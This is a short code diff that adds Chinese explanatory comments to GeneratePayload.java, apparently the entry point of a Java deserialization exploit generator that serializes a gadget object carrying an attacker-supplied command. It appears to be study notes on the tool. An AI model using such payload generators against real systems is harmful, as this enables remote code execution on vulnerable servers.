@@ -21,6 +21,7 @@ public class GeneratePayload {
 		final String payloadType = args[0];
 		final String command = args[1];
 
+		// 拿到要序列化的gadget类
 		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
 		if (payloadClass == null) {
 			System.err.println("Invalid payload type '" + payloadType + "'");
@@ -30,10 +31,14 @@ public class GeneratePayload {
 		}
 
 		try {
+		    // 对gadget类进行实例化，生成payload
 			final ObjectPayload payload = payloadClass.newInstance();
+			// 每个gadget的payload构造不同就看这个getObject了
 			final Object object = payload.getObject(command);
 			PrintStream out = System.out;
+			// 对实例化的对象进行序列化
 			Serializer.serialize(object, out);
+			// 最后将payload打印出来
 			ObjectPayload.Utils.releasePayload(payload, object);
 		} catch (Throwable e) {
 			System.err.println("Error while generating or serializing payload");
